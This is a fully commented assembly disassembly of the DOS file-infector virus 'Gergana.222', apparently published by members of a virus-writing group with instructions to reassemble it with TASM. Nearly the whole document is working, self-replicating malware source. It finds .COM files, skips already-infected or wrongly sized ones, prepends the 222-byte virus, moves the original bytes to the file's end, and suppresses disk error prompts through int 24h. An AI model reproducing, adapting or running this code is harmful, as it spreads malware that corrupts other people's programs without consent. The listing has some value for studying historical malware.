
; Gergana.222
; disassembly by Metabolis/VLAD
; with a small amount of help from Qark :)

; I thought it would be interesting since it infects the start of
; files whereas most will append.

; use TASM to re-assemble

int24s          equ     12h                     ; original int 24h
int24o          equ     14h                     ; handler location
dtapos          equ     80h                     ; DTA position in memory
fbuffer         equ     0FA00h                  ; 222 byte buffer
inf_flag        equ     0FA46h                  ; infection flag
tempdta         equ     0FF80h                  ; Where to store temp DTA
filename        equ     0FF9Eh                  ; Where the filename is :)

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a

		org	100h

gerg_222        proc    far

start:
                mov     ax,flength
		push	ax
                mov     dx,tempdta              ; Temporarily store
                mov     ah,1Ah                  ; DTA at address tempdta
                int     21h                     ; Set DTA to buffer
                mov     cx,20h                  ; attributes to search for
                mov     dx,offset filemask      ; '*.COM'
                mov     ah,4Eh                  ; Find 1st file matching the
                int     21h                     ; above string..
                jc      finish_up               ; uh oh.. no files!
                mov     dx,offset int_24h_entry ; Attach the new error
                mov     ax,2524h                ; handling procedure to
                int     21h                     ; int 24h :)

read_virus:
                mov     dx,filename             ; open file with filename
                mov     ax,3D02h                ; to read
                int     21h
                jc      find_next               ; can't open file! goto find_next
                xchg    bx,ax                   ; put file handle into BX
                mov     cx,0DEh                 ; read 222 bytes
                mov     dx,fbuffer              ; into fbuffer
		mov	ah,3Fh
                int     21h
                jnc     infect                  ; no error goto infect
find_next:
                call    close_file
		mov	ah,4Fh
                int     21h                     ; find next file!
                jc      finish_up               ; no more files, goto finish_up
                jnc     read_virus              ; open and read the virus!

gerg_222	endp

close_file      proc    near
                mov     ah,3Eh
                int     21h                     ; close file with handle
                                                ; in BX
		retn
close_file      endp

filemask        db      '*.COM', 00h            ; file mask for search
flength         dw      0DEh                    ; file length

write_virus     proc    near
                mov     ah,40h                  ; write the virus (222 bytes)
		mov	cx,0DEh
                int     21h
		retn
write_virus     endp

infect:
                mov     cx,cs:inf_flag
		cmp	cx,2E2Ah
                je      find_next               ; if file is infected find next
		mov	ax,4202h
                xor     cx,cx                   ; lseek to the end of the
                xor     dx,dx                   ; file
                int     21h
                cmp     ax,0C350h               ; if file is bigger than
                ja      find_next               ; 50000 don't infect
                cmp     ax,100h                 ; if file is smaller than
                jb      find_next               ; 256 don't infect
                mov     flength,ax              ; put file length in flength
                mov     dx,fbuffer              ; point to the file buffer
                call    write_virus             ; write the 222 bytes which
                                                ; were originally at the
                                                ; start of the infected
                                                ; program
                jc      find_next               ; no can do, find next!
		mov	ax,4200h
                xor     cx,cx                   ; seek to the beginning
                xor     dx,dx                   ; of the file using
                int     21h                     ; the file handle BX
                mov     dx,100h                 ; from 100h (which is where
                call    write_virus             ; the virus is)
                jc      find_next               ; no can do, find another file!
                call    close_file              ; infected! close the file
finish_up:
                mov     dx,cs:int24s            ; return the error handling
                mov     ax,cs:int24o            ; interrupt 24h to its
                mov     ds,ax                   ; previous state
		mov	ax,2524h
                int     21h
		push	cs
		pop	ds
		mov	ah,1Ah
                mov     dx,dtapos               ; set DTA back to original
                int     21h                     ; position 80h
                mov     si,offset execute_original
                mov     di,tempdta
		mov	cx,30h
                rep     movsb                   ; move 30 bytes from the
                                                ; execute original code
                                                ; to the tempdta storage
                jmp     $-237h                  ; jump back 567 bytes to
                                                ; execute the next part
                                                ; of the program

execute_original:

                pop     si                      ; prolly points to here
                add     si,100h                 ; add start of com address
                mov     di,100h                 ; set destination as com start.
                mov     cx,0deh                 ; virus length.
                repz    movsb                   ; move original code back.
                mov     ax,100h
                jmp     ax                      ; return to original code.

copyright       db      'Gergana II -BUL'       ; authors signature

int_24h_entry   proc    far
                xor     ax,ax                   ; Zero register
                iret                            ; Interrupt return
int_24h_entry   endp

                db       90h, 90h,0CDh, 20h     ; Initial 4 bytes of infectee

seg_a           ends

                end     start
